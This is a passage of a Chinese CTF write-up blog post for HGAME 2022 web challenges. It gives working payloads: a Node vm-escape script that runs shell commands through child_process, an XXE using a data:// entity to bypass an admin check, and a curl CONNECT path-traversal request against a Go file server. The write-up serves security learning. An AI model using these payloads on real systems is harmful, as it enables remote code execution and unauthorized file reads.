&#123;</span><br><span class="line">        <span class="keyword">const</span> index = <span class="built_in">this</span>._indexOf(active);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>)</span><br><span class="line">          <span class="built_in">this</span>[index] = <span class="built_in">window</span>;</span><br><span class="line">        <span class="built_in">this</span>.current = active = <span class="built_in">window</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">window</span>)</span><br><span class="line">        <span class="built_in">this</span>._browser._eventLoop.setActiveWindow(<span class="built_in">window</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> name = options.name === <span class="string">&#x27;_blank&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : (options.name || <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    options.name = name;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">window</span> = open(options);</span><br><span class="line">    <span class="built_in">this</span>.push(<span class="built_in">window</span>);</span><br><span class="line">    <span class="keyword">if</span> (name &amp;&amp; (<span class="built_in">this</span>.propertyIsEnumerable(name) || !<span class="built_in">this</span>[name]))</span><br><span class="line">      <span class="built_in">this</span>[name] = <span class="built_in">window</span>;</span><br><span class="line">    <span class="built_in">this</span>.current = active = <span class="built_in">window</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>open()返回值<code>window</code>来自于函数内部open变量代表的函数调用后的结果，跟进createHistory()</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">createHistory</span>(<span class="params">browser, focus</span>) </span>&#123;</span><br><span class="line">  assert(browser &amp;&amp; browser.visit, <span class="string">&#x27;Missing parameter browser&#x27;</span>);</span><br><span class="line">  assert(focus &amp;&amp; focus.call, <span class="string">&#x27;Missing parameter focus or not a function&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> history = <span class="keyword">new</span> History(browser, focus);</span><br><span class="line">  <span class="keyword">return</span> history.open.bind(history);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>又调用了History.open，跟进History对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">History</span> </span>&#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="function"><span class="title">open</span>(<span class="params">args</span>)</span> &#123;</span><br><span class="line">    args.browser = <span class="built_in">this</span>.browser;</span><br><span class="line">    args.history = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">document</span>  = loadDocument(args);</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">window</span>    = <span class="built_in">document</span>.defaultView;</span><br><span class="line">    <span class="built_in">this</span>.addEntry(<span class="built_in">window</span>, args.url);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进loadDocument()函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">loadDocument</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">	<span class="keyword">if</span> (<span class="regexp">/^javascript:/</span>.test(url)) &#123;</span><br><span class="line">    <span class="built_in">window</span>._eventQueue.enqueue(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">document</span>.close();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">window</span>._evaluate(url.slice(<span class="number">11</span>), <span class="string">&#x27;javascript:&#x27;</span>);</span><br><span class="line">        browser.emit(<span class="string">&#x27;loaded&#x27;</span>, <span class="built_in">document</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        browser.emit(<span class="string">&#x27;error&#x27;</span>, error);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">document</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> javascript 伪协议的代码内容会被传递给 <code>window._evaluate</code>，跟进</p>
<p><img src="/2022/02/12/hgame-wp/image-20220221143053017.png" alt="image-20220221143053017"></p>
<p>_evaluate()使用nodejs 的 <code>vm</code> 模块运行 js 代码，代码运行的上下文就是 <code>window</code> 对象，按照 nodejs 官方的说法，vm 并不是一种安全的机制，不应该用它来运行不安全的代码，攻击者构造包含恶意 javascript 代码的页面，使用 Zoombie 访问后就有可能产生 vm 逃逸实现 RCE</p>
<p>这里贴个payload：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> h=<span class="string">&#x27;child_p&#x27;</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> e=<span class="string">&#x27;rocess&#x27;</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> i=[h,e].join(<span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">x=clearImmediate[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>]([<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span>])();</span></span><br><span class="line"><span class="javascript">y=x.mainModule.require(i);</span></span><br><span class="line"><span class="javascript">z=y.execSync(<span class="string">&#x27;cat /flag&#x27;</span>).toString();</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(z);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/12/hgame-wp/image-20220221162052869.png" alt="image-20220221162052869"></p>
<h1 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h1><p><code>www.zip</code>源码泄露，审计源码</p>
<p>waf函数过滤了很多php的协议，但还有data协议未过滤</p>
<p>有个关键函数parseXML()，其中有一段代码为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseXML</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">   	......</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$attrs</span>-&gt;sender == <span class="string">&#x27;admin&#x27;</span> &amp;&amp; !preg_match(<span class="string">&#x27;/admin/i&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">&#x27;hgame&#123;xxxxx&#125;&#x27;</span>;</span><br><span class="line">        <span class="variable">$attrs</span>-&gt;content = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$attrs</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若sender标签的值为admin且正则匹配没有匹配到admin的话就会直接返回flag，结合上面没有被过滤的data协议，可以构造一个base64编码的admin来xxe，payload如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;data://text/plain;base64,YWRtaW4=&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">content</span>&gt;</span>hgame<span class="tag">&lt;/<span class="name">content</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>抓包，POST传参内容替换为payload，放包，即可得到flag</p>
<p><img src="/2022/02/12/hgame-wp/image-20220216135740468-16451642991921.png" alt="image-20220216135740468"></p>
<h1 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h1><p>main.go源码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fileHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	http.FileServer(http.Dir(<span class="string">&quot;./&quot;</span>)).ServeHTTP(w, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, fileHandler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/there_may_be_a_flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		w.Write([]<span class="keyword">byte</span>(<span class="string">`No! You can&#x27;t see the flag!`</span>))</span><br><span class="line">	&#125;)</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;:8889&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>fileHandler()有问题，存在漏洞可以跨路径读取flag，思路与<a target="_blank" rel="noopener" href="https://brycec.me/posts/justctf2020_writeups#go-fs">justCTF2020的Go-fs</a>类似</p>
<p><strong>1.curl –path-as-is会使curl完全按照URL中提供的方式发送路径，而不会删除任何点段</strong></p>
<p><strong>2.对于CONNECT请求，url中的特殊字符不会被处理</strong></p>
<p>payload为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X CONNECT --path-as-is http://3445d0f8a3.filesystem.hgame.homeboyc.cn/123/../there_may_be_a_flag</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/12/hgame-wp/image-20220218160144932.png" alt="image-20220218160144932"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">wuyusanhua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://wuyusanhua2021.github.io/2022/02/12/hgame-wp/">https://wuyusanhua2021.github.io/2022/02/12/hgame-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2022/02/17/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%AD%A6%E4%B9%A0/"><i class="fa fa-chevron-left">  </i><span>条件竞争学习</span></a></div><div class="next-post pull-right"><a href="/2022/02/09/secrets-of-admin/"><span>祥云杯2021-secrets_of_admin</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://www.socwall.com/images/wallpapers/98278-5120x2880.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021 - 2022 By wuyusanhua</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>